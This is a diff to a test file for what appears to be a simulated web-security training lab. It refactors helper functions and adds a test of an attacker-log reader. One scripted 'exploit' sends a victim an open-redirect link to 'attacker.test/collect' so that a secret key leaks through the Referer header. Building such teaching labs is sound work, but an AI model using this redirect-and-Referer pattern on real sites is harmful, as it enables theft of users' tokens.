@@ -17,7 +17,9 @@ import {
   ADMIN_MAILBOX, PLAYER_MAILBOX, SIM_LIMITS, VICTIM_LABELS, sendSimRedirect, simWorld,
   type SimBrowser, type SimRedirectStatus, type SimRequest, type SimResponse, type SimWorld,
 } from '../src/core/sim.js';
-import { FLAG_RE, bare, describeExploitMatrix, describeLabView, freshSession, type Agent } from './helpers.js';
+import {
+  FLAG_RE, attackerHits, bare, describeExploitMatrix, describeLabView, freshSession, panelOf, referers, type Agent,
+} from './helpers.js';
 
 const view = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'sim-courier.ejs');
 const hello = join(dirname(fileURLToPath(import.meta.url)), 'fixtures', 'hello.ejs');
@@ -138,11 +140,6 @@ const sendLink = (agent: Agent, level: Level, url: unknown) =>
   agent.post(`${LAB}/victim/send-link?level=${level}`).type('form').send({ url: url as string });
 const checkMail = (agent: Agent, level: Level) => agent.post(`${LAB}/victim/check-mail?level=${level}`);
 const labPage = (agent: Agent, level: Level, lang = 'en') => agent.get(`${LAB}?level=${level}&lang=${lang}`);
-const panelOf = (html: string): string => /<section class="sim-panel"[\s\S]*?<\/section>/.exec(html)?.[0] ?? '';
-const unescapeHtml = (s: string) => s
-  .replace(/&lt;/g, '<').replace(/&gt;/g, '>').replace(/&#34;|&quot;/g, '"').replace(/&#39;/g, "'").replace(/&amp;/g, '&');
-/** What the player's server received: every Referer shown on the lab page, unescaped. */
-const referers = (html: string): string[] => [...panelOf(html).matchAll(/Referer: <code>([^<]*)<\/code>/g)].map((m) => unescapeHtml(m[1]));
 
 type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Response>;
 
@@ -150,7 +147,7 @@ type Script = (agent: Agent, level: Level, sid: string) => Promise<request.Respo
 const exploit: Script = async (agent, level) => {
   await sendLink(agent, level, 'http://citadel.test/continue?next=http://attacker.test/collect');
   const page = await labPage(agent, level);
-  const ref = referers(page.text).find((r) => r.includes('key='));
+  const ref = attackerHits(page.text).find((h) => h.url === 'http://attacker.test/collect')?.referer;
   const key = ref === undefined ? 'none' : new URL(ref).searchParams.get('key') ?? 'none';
   return agent.post(`${LAB}?level=${level}`).type('form').send({ key });
 };
@@ -207,6 +204,18 @@ describe('victim-driven lab: the full pattern over HTTP', () => {
     expect(lab.world.visits[0].hops.map((h) => [h.site, h.via])).toEqual([['citadel', 'start'], ['citadel', 'redirect'], ['attacker', 'refresh']]);
     const vault = await agent.post(`${LAB}?level=acolyte`).type('form').send({ key: referers(page.text).map((r) => new URL(r).searchParams.get('key'))[0] });
     expect(vault.text).toMatch(FLAG_RE);
+  });
+
+  it('attackerHits reads exactly what the attacker log holds (method, URL, Referer, body, time; oldest first)', async () => {
+    const { agent, sid } = await freshSession();
+    const lab = labFor({ sessionId: sid, level: 'acolyte' });
+    lab.world.now = () => Date.UTC(2026, 10, 15, 12, 0, 0);
+    lab.world.attackerLog.record({ method: 'POST', url: 'http://attacker.test/p?a=1&b=2', body: `code=a&x=<"'>` });
+    await sendLink(agent, 'acolyte', 'http://citadel.test/continue?next=http://attacker.test/collect');
+    const hits = attackerHits((await labPage(agent, 'acolyte', 'id')).text); // the body label is translated
+    expect(hits.find((h) => h.method === 'GET')?.referer).toContain(`key=${lab.key}`);
+    expect(hits).toEqual(lab.world.attackerLog.entries().map((e) => ({ ...e, at: new Date(e.at).toISOString() })));
+    expect(hits.map((h) => h.seq)).toEqual([1, 2]);
   });
 
   it('divine: the same link reaches your server, but with no Referer, so no key', async () => {
